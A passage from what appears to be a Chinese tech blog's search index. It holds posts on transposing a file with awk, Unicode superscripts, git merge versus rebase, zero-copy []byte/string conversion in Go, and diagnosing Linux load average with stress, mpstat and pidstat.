class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之转置文件的内容</title>
      <link href="/2022/05/30/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9/"/>
      <url>/2022/05/30/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>写一个 bash脚本来转置文本文件nowcoder.txt中的文件内容。</p><p>为了简单起见，你可以假设：<br>你可以假设每行列数相同，并且每个字段由空格分隔</p><p>示例:<br>假设 nowcoder.txt 内容如下：<br>job salary<br>c++ 13<br>java 14<br>php 12</p><p>你的脚本应当输出（以词频升序排列）：<br>job c++ java php<br>salary 13 14 12</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>NF是有几列，NR是第几行<br>把第一行的拿出来当开头，后面第二行第三行跟着往后面放就行了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    for(i=1;i&lt;=NF;i++)&#123;</span></span><br><span class="line"><span class="string">      if(NR==1)&#123;</span></span><br><span class="line"><span class="string">        row[i] = $i;</span></span><br><span class="line"><span class="string">      &#125;else&#123;</span></span><br><span class="line"><span class="string">        row[i] = row[i]&quot; &quot;$i;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;END&#123;</span></span><br><span class="line"><span class="string">  for(i=1;i&lt;=NF;i++)&#123;</span></span><br><span class="line"><span class="string">    print row[i]</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;</span> ./nowcoder.txt</span><br></pre></td></tr></table></figure><p>**如果去掉 **<code>**&#125;END&#123;**</code><br><img src="http://106.12.125.218/medias/medias/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9/0.png"></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用英文数字上下标箭头等（可直接复制）</title>
      <link href="/2022/05/21/%E5%AE%9E%E7%94%A8%E8%8B%B1%E6%96%87%E6%95%B0%E5%AD%97%E4%B8%8A%E4%B8%8B%E6%A0%87%E7%AE%AD%E5%A4%B4%E7%AD%89%EF%BC%88%E5%8F%AF%E7%9B%B4%E6%8E%A5%E5%A4%8D%E5%88%B6%EF%BC%89/"/>
      <url>/2022/05/21/%E5%AE%9E%E7%94%A8%E8%8B%B1%E6%96%87%E6%95%B0%E5%AD%97%E4%B8%8A%E4%B8%8B%E6%A0%87%E7%AE%AD%E5%A4%B4%E7%AD%89%EF%BC%88%E5%8F%AF%E7%9B%B4%E6%8E%A5%E5%A4%8D%E5%88%B6%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li><strong>经过收集整理了一些数字和字母的上下标（复制后可直接使用）</strong></li></ul><p><strong>一、上标</strong><br>（一）、数字<br>2⁰¹²³⁴⁵⁶⁷⁸⁹⁺⁻⁼⁽⁾ⁿ<br>举例一道希望杯试题，如果x²+2x=3<br>那么x⁴+7x³+8x²-13x+15=</p><hr><p>（二）、字母<br><strong>a</strong>ᵃ ᵇ ᶜ ᵈ ᵉ ᵍ ʰ ⁱ ʲ ᵏ ˡ ᵐ ⁿ ᵒ ᵖ ʳ ˢ ᵗ ᵘ ᵛ ʷ ˣ ʸ ᙆ<br><strong>A</strong>ᴬ ᴮ ᒼ ᴰ ᴱ ᴳ ᴴ ᴵ ᴶ ᴷ ᴸ ᴹ ᴺ ᴼ ᴾ ᴼ̴ ᴿ ˢ ᵀ ᵁ ᵂ ˣ ᵞ ᙆ<br>还有几个组合，也许偶尔能用上<br>␁ ␂ ␃ ␄ ␅ ␆ ␇ ␈ ␉ ␊ ␋ ␌ ␍ ␎ ␏ ␐ ␕ ␖ ␗ ␘ ␙ ␚ ␛ ␜ ␝ ␞ ␟ ␠ ␤</p><hr><hr><p><strong>二、下标</strong><br>(1)数字<br>₀₁₂₃₄₅₆₇₈₉₊₋₌₍₎<br>a₁+a₂+a₍₎<br>（2）字母<br><strong>A</strong>ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ<br><strong>aₐ ₑ ᵢ ₒ ᵣ ᵤ ᵥ ₓ</strong><br><strong>三、其它一些符号：</strong><br>分数 （是由上、下标加斜线组合出）<br>二分之一 ½ ½<br>三分之一 ⅓ ⅓<br>四份之一 ¼ ¼<br>……<br>其他学用数学符号<br>乘 号 × ×<br>除 号 ÷ ÷<br>正 负 ± ±<br>根 号 √ √<br>因 为 ∵ ∵<br>所 以 ∴ ∴<br>大于等于 ≥ ≥<br>小于等于 ≤ ≤<br>约等于 ≈ ≈<br>不等于 ≠ ≠<br>全 等 ≌ ≌<br>垂 直 ⊥ ⊥<br>角 度 ∠ ∠<br>度 数 º º<br>圆 形 ⊙ ⊙<br>十字圆 ⊕ ⊕<br>直角三角形 ⊿ ⊿<br>无穷大 ∞ ∞<br>单箭头(1) ↑ ↓ ← →<br>单箭头(2) ↖ ↗ ↘ ↙<br>积分符号 ∫ ∫</p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git-Merge和Rebase的总结</title>
      <link href="/2022/05/14/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2022/05/14/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>Merge和Rebase是合并两个分支的操作。<strong>都是checkout到某个分支上，然后把别的分支合并的该分支。</strong><br>其中，Merge在没有分叉的情况下，会自动使用fast-forward的方式，<strong>快速移动</strong>：<br><img src="http://106.12.125.218/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/0.png"><br>Merge在有分叉的情况下，<strong>会产生一个新的提交点</strong>，（–no-ff）他就是别的分支多次commit的合并：<br><img src="http://106.12.125.218/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/1.png"><br>Rebase叫做变基。也是把别的分支合到自己身上，但是<strong>效果就好像在基的基础上重新提交自己的多次commit。</strong>看起来就好像重新从基抽出来一次：<br><img src="http://106.12.125.218/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/2.png"><br>“把自己的提交（2-3）顶到最后面”</p><h2 id="异同"><a href="#异同" class="headerlink" title="异同"></a><strong>异同</strong></h2><h3 id="作用大体相同"><a href="#作用大体相同" class="headerlink" title="作用大体相同"></a>作用大体相同</h3><p>都是把别的分支合到自己身上。别的分支不会改变，变的只是自己。</p><h3 id="效果有些不同"><a href="#效果有些不同" class="headerlink" title="效果有些不同"></a>效果有些不同</h3><p>对于merge branch，它是把branch的多次提交合成一个commit，然后加在自己分支的后面。（2-3-6）6就是4和5合成的一个新的提交点。自己的提交（45）在前面，别人的合并在后面。<br><img src="http://106.12.125.218/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/3.png"><br>对于Rebase branch，它就好像在branch（基）的基础上，重新提交自己的多次commit。（4-5-2-3）看起来就好像重新从基抽出来一次。<br>自己的提交总是在最后面。而且不会多出一个提交点。<br><img src="http://106.12.125.218/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/4.png"></p><h3 id="使用场景不同"><a href="#使用场景不同" class="headerlink" title="使用场景不同"></a>使用场景不同</h3><ol><li>当我们在分支future上添加了新功能时，我们直接在主分支master上，Merge一下future，就把新功能加上了。（future你是否继续开发无所谓）。这就是我们的<strong>FristProject和SecondProject：在公共分支master上Merge别的功能分支</strong>。</li><li>当我们在功能分支future上开发开发开发，提交提交提交，这个过程中，有人动了主分支master，你想要把这个更改同步到你的future分支上，你选择Rebase master。这样的话你的几个commits就一直处于你分支的最后面。<strong>这就是我们的ThirdProject：在开发分支上Rebase主分支，主要是为了和上游分支同步</strong>。</li><li>当然你也可以选择在你的功能分支future上，Merge别的分支。这时候别的分支的commits就作为一个新的提交点跑到你的多次commits的后面了。<strong>如果你无所谓顺序，那么可以选择Merge。这对应我们的FourthProject：在开发分支上Merge别的分支</strong>。</li><li>切记：不要再公共分支master上Rebase！！！因为Rebase之后，master上的多次提交会被顶到别的分支的后面，这就相当于篡改了历史！别人从3这个地方拉出去的，结果你一下子把3给顶到最后面了，那就乱套了。</li></ol><h3 id="总结一下："><a href="#总结一下：" class="headerlink" title="总结一下："></a>总结一下：</h3><ol><li><strong>公共分支上选择Merge（将新功能整合到master上）</strong></li><li><strong>功能分支上选择Rebase主分支（和公共分支同步，把自己的提交顶到最后）</strong></li><li><strong>功能分支上选择Merge（把别的分支的功能加到自己身上，如果你不介意顺序的话）</strong></li><li><strong>切记不要再公共分支上Rebase任何分支！</strong></li></ol><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>也谈不上什么优缺点。在适合的场景使用适合的方式。（1、2）<br>对于3这种情况，比如你要把future开发分支上的新功能导到test测试分支里面去，你可以切到test，然后Merge一下future。因为是测试分支，你没有必要把非要把test的提交顶到最后，于是你就可以选择Merge，而且多出一个节点，用于记录。这是Merge的小优点。<br>当然你也可以选择Rebase一下future，这样的话，你test分支上的多次commit就还是在最后，便于你回退。这是Rebase的优点。（如果使用Merge的话，由于尾巴是future的合并，你再想回退到你test上的某次提交，那就有点麻烦了）。</p><h2 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a><strong>特别说明</strong></h2><p><strong>切记不要再公共分支上Rebase任何分支！</strong><br>（这我们已经解释过）<br><strong>本地和远端对应同一条分支，优先使用Rebase而不是Merge</strong><br>什么意思呢？<br>我们刚刚演示所用到的分支都是本地上的两个分支。<br>当我们从远端orgin/master 拉取（pull）的时候，或者在pycharm、IDEA里面选择Update Project的时候，它总是提示你选择Merge还是Rebase：<br><img src="http://106.12.125.218/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/5.png"><br>可是你想，我就一个master分支啊，远程也是master分支呀，怎么就怎么就设计到了合并分支的操作了？<br>其实是这样的：<br>git有本地仓库的概念，本地的master是一个仓库，远程的master也是一个仓库，git pull == git fetch + git merge，也就是说，这里让你选择的是，将远程的master拉取下来之后，如何和你的本地master合并？<br>我们推荐使用Rebase：站在你本地master分支上，Rebase一下远程master。这样的话你刚刚在本地master所做的多个提交，依然会被顶在你本地master分支的最后面。便于你回退。</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go[]byte和string的高性能转换</title>
      <link href="/2022/05/14/go%5B%5Dbyte%E5%92%8Cstring%E7%9A%84%E9%AB%98%E6%80%A7%E8%83%BD%E8%BD%AC%E6%8D%A2/"/>
      <url>/2022/05/14/go%5B%5Dbyte%E5%92%8Cstring%E7%9A%84%E9%AB%98%E6%80%A7%E8%83%BD%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<p>在<a href="https://github.com/valyala/fasthttp#fasthttp-best-practices">fasthttp</a>的最佳实践中有这么一句话：<br>Avoid conversion between []byte and string, since this may result in memory allocation+copy. Fasthttp API provides functions for both []byte and string - use these functions instead of converting manually between []byte and string. There are some exceptions - see <a href="https://github.com/golang/go/wiki/CompilerOptimizations#string-and-byte">this wiki page</a> for more details.<br>大概意思就是说，要尽量避免[]byte和string的转换，因为转换过程会存在内存拷贝，影响性能。此外在fasthttp中还提出了一个解决方案，用于[]byte和string的高性能转换。直接看下源码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b2s converts byte slice to a string without memory allocation.</span></span><br><span class="line"><span class="comment">// See https://groups.google.com/forum/#!msg/Golang-Nuts/ENgbUzYvCuU/90yGx7GUAgAJ .</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Note it may break if string and/or slice header will change</span></span><br><span class="line"><span class="comment">// in the future go versions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">b2s</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="comment">/* #nosec G103 */</span></span><br><span class="line"><span class="keyword">return</span> *(*<span class="keyword">string</span>)(unsafe.Pointer(&amp;b))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// s2b converts string to a byte slice without memory allocation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Note it may break if string and/or slice header will change</span></span><br><span class="line"><span class="comment">// in the future go versions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">s2b</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(b []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">/* #nosec G103 */</span></span><br><span class="line">bh := (*reflect.SliceHeader)(unsafe.Pointer(&amp;b))</span><br><span class="line"><span class="comment">/* #nosec G103 */</span></span><br><span class="line">sh := (*reflect.StringHeader)(unsafe.Pointer(&amp;s))</span><br><span class="line">bh.Data = sh.Data</span><br><span class="line">bh.Cap = sh.Len</span><br><span class="line">bh.Len = sh.Len</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到上述实现中并没有内存拷贝，使用类似C语言的类型强转实现[]byte和string之间的类型转换。那么他们和一般使用的转换之间的性能差异有多大?看下如下性能测试：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;adsfasdfadsfadsfasdfadfadfasdfasdfadsfasdfasdfasdfsadfas&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkB2sFast</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">       _ = s2b(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkB2sStd</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _ []<span class="keyword">byte</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        _ = []<span class="keyword">byte</span>(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bt = []<span class="keyword">byte</span>(<span class="string">&quot;adsfasdfadsfadsfasdfadfadfasdfasdfadsfasdfasdfasdfsadfas&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkS2BFast</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        _ = b2s(bt)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkS2BStd</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _ []<span class="keyword">byte</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        _ = <span class="keyword">string</span>(bt)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试结果如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">goos: windows</span><br><span class="line">goarch: amd64</span><br><span class="line">pkg: awesomeProject5/lib</span><br><span class="line">cpu: Intel(R) Core(TM) i7<span class="number">-10510</span>U CPU @ <span class="number">1.80</span>GHz</span><br><span class="line">BenchmarkB2sFast</span><br><span class="line">BenchmarkB2sFast<span class="number">-8</span>   <span class="number">1000000000</span>         <span class="number">0.2383</span> ns/op</span><br><span class="line">BenchmarkB2sStd</span><br><span class="line">BenchmarkB2sStd<span class="number">-8</span>    <span class="number">41089557</span>        <span class="number">27.65</span> ns/op</span><br><span class="line">BenchmarkS2BFast</span><br><span class="line">BenchmarkS2BFast<span class="number">-8</span>   <span class="number">1000000000</span>         <span class="number">0.2378</span> ns/op</span><br><span class="line">BenchmarkS2BStd</span><br><span class="line">BenchmarkS2BStd<span class="number">-8</span>    <span class="number">54249056</span>        <span class="number">22.51</span> ns/op</span><br><span class="line">PASS</span><br></pre></td></tr></table></figure><p>可以看到在相同测试条件下，其性能差异竟然达到了100倍！<br>可见在高频网络访问中，如果直接在[]byte和string之间进行转换将会花费多大的性能！<br>需要注意的是这种方式也有弊端，在代码注释中可以看到它依赖golang中的string或slice的首部定义。如果后续golang版本对此有修改，则有可能导致代码无法运行。</p><blockquote><p>参考资料<br><a href="https://www.cnblogs.com/charlieroro/p/15410902.html">https://www.cnblogs.com/charlieroro/p/15410902.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux平均负载怎么理解</title>
      <link href="/2022/05/14/linux%E5%B9%B3%E5%9D%87%E8%B4%9F%E8%BD%BD%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3/"/>
      <url>/2022/05/14/linux%E5%B9%B3%E5%9D%87%E8%B4%9F%E8%BD%BD%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是平均负载"><a href="#什么是平均负载" class="headerlink" title="什么是平均负载"></a>什么是平均负载</h2><p>平均负载是指单位时间内，系统处于<strong>可运行状态</strong>和<strong>不可中断状态</strong>的平均进程数，也就是<strong>平均活跃进程数</strong>，它和 CPU 使用率并没有直接关系。<br>所谓可运行状态的进程，是指正在使用 CPU 或者正在等待 CPU 的进程，也就是我们常用 ps 命令看到的，处于 R 状态（Running 或 Runnable）的进程。<br>不可中断状态的进程则是正处于内核态关键流程中的进程，并且这些流程是不可打断的，比如最常见的是<strong>等待硬件设备的 I/O 响应</strong>，也就是我们在 ps 命令中看到的 D 状态（Uninterruptible Sleep，也称为 Disk Sleep）的进程。<br>比如当平均负载为 2 时，意味着什么呢？</p><ul><li>在只有 2 个 CPU 的系统上，意味着所有的 CPU 都刚好被完全占用。</li><li>在 4 个 CPU 的系统上，意味着 CPU 有 50% 的空闲。</li><li>而在只有 1 个 CPU 的系统中，则意味着有一半的进程竞争不到 CPU。</li></ul><h2 id="平均负载为多少时合理"><a href="#平均负载为多少时合理" class="headerlink" title="平均负载为多少时合理"></a>平均负载为多少时合理</h2><p>平均负载最理想的情况是等于 CPU 个数。所以在评判平均负载时，<strong>首先你要知道系统有几个 CPU</strong>，这可以通过 top 命令或者从文件 /proc/cpuinfo 中读取，比如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#关于 grep 和 wc 的用法请查询它们的手册或者网络搜索</span><br><span class="line">grep <span class="string">&#x27;model name&#x27;</span> /proc/cpuinfo | wc -l</span><br></pre></td></tr></table></figure><p>平均负载有三个数值，到底该参考哪一个呢？<br>实际上，都要看。三个不同时间间隔的平均值，其实给我们提供了，分析<strong>系统负载趋势</strong>的数据来源，让我们能更全面、更立体地理解目前的负载状况。<br>假设我们在一个单 CPU 系统上看到平均负载为 1.73，0.60，7.98，那么说明在过去 1 分钟内，系统有 73% 的超载，而在 15 分钟内，有 698% 的超载，从整体趋势来看，系统的负载在降低。</p><h2 id="平均负载与-CPU-使用率"><a href="#平均负载与-CPU-使用率" class="headerlink" title="平均负载与 CPU 使用率"></a>平均负载与 CPU 使用率</h2><p>CPU 使用率，是单位时间内 CPU 繁忙情况的统计，跟平均负载并不一定完全对应。比如：</p><ul><li>CPU 密集型进程，使用大量 CPU 会导致平均负载升高，此时这两者是一致的；</li><li>I/O 密集型进程，等待 I/O 也会导致平均负载升高，但 CPU 使用率不一定很高；</li><li>大量等待 CPU 的进程调度也会导致平均负载升高，此时的 CPU 使用率也会比较高。</li></ul><h2 id="平均负载案例分析"><a href="#平均负载案例分析" class="headerlink" title="平均负载案例分析"></a>平均负载案例分析</h2><p>stress 是一个 Linux 系统压力测试工具，这里我们用作异常进程模拟平均负载升高的场景。<br>而 sysstat 包含了常用的 Linux 性能工具，用来监控和分析系统的性能。我们的案例会用到这个包的两个命令 mpstat 和 pidstat。</p><ul><li>mpstat 是一个常用的多核 CPU 性能分析工具，用来实时查看每个 CPU 的性能指标，以及所有 CPU 的平均指标。</li><li>pidstat 是一个常用的进程性能分析工具，用来实时查看进程的 CPU、内存、I/O 以及上下文切换等性能指标。</li></ul><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#模拟一个 CPU 使用率 <span class="number">100</span>% 的场景</span><br><span class="line">stress --cpu <span class="number">1</span> --timeout <span class="number">600</span></span><br><span class="line">#模拟 I/O 压力，即不停地执行 sync</span><br><span class="line">stress -i <span class="number">1</span> --timeout <span class="number">600</span></span><br><span class="line">#模拟 <span class="number">8</span> 个进程抢占cpu</span><br><span class="line">stress -c <span class="number">8</span> --timeout <span class="number">600</span></span><br></pre></td></tr></table></figure><p>运行 uptime 查看平均负载的变化情况：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># -d 参数表示高亮显示变化的区域</span><br><span class="line">$ watch -d uptime</span><br><span class="line">...,  load average: <span class="number">1.00</span>, <span class="number">0.75</span>, <span class="number">0.39</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行 mpstat 查看 CPU 使用率的变化情况：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -P ALL 表示监控所有 CPU，后面数字 <span class="number">5</span> 表示间隔 <span class="number">5</span> 秒后输出一组数据</span><br><span class="line">mpstat -P ALL <span class="number">5</span></span><br><span class="line">Linux <span class="number">4.15</span><span class="number">.0</span> (ubuntu) <span class="number">09</span>/<span class="number">22</span>/<span class="number">18</span> _x86_64_ (<span class="number">2</span> CPU)</span><br><span class="line"><span class="number">13</span>:<span class="number">30</span>:<span class="number">06</span>     CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle</span><br><span class="line"><span class="number">13</span>:<span class="number">30</span>:<span class="number">11</span>     all   <span class="number">50.05</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>   <span class="number">49.95</span></span><br><span class="line"><span class="number">13</span>:<span class="number">30</span>:<span class="number">11</span>       <span class="number">0</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>  <span class="number">100.00</span></span><br><span class="line"><span class="number">13</span>:<span class="number">30</span>:<span class="number">11</span>       <span class="number">1</span>  <span class="number">100.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行pidstat查看是哪个进程导致：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 间隔 <span class="number">5</span> 秒后输出一组数据</span><br><span class="line">$ pidstat -u <span class="number">5</span> <span class="number">1</span></span><br><span class="line"><span class="number">13</span>:<span class="number">37</span>:<span class="number">07</span>      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command</span><br><span class="line"><span class="number">13</span>:<span class="number">37</span>:<span class="number">12</span>        <span class="number">0</span>      <span class="number">2962</span>  <span class="number">100.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>  <span class="number">100.00</span>     <span class="number">1</span>  stress</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>归纳一下平均负载的理解。<br>平均负载是指单位时间内，系统处于<strong>可运行状态</strong>和<strong>不可中断状态</strong>的平均进程数，也就是<strong>平均活跃进程数。</strong><br>平均负载提供了一个快速查看系统整体性能的手段，反映了整体的负载情况。但只看平均负载本身，我们并不能直接发现，到底是哪里出现了瓶颈。所以，在理解平均负载时，也要注意：</p><ul><li>平均负载高有可能是 CPU 密集型进程导致的；</li><li>平均负载高并不一定代表 CPU 使用率高，还有可能是 I/O 更繁忙了；</li><li>当发现负载高的时候，你可以使用 mpstat、pidstat 等工具，辅助分析负载的来源。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go函数返回局部变量的指针是否安全</title>
      <link href="/2022/05/13/go%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E6%8C%87%E9%92%88%E6%98%AF%E5%90%A6%E5%AE%89%E5%85%A8/"/>
      <url>/2022/05/13/go%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E6%8C%87%E9%92%88%E6%98%AF%E5%90%A6%E5%AE%89%E5%85%A8/</url>
      
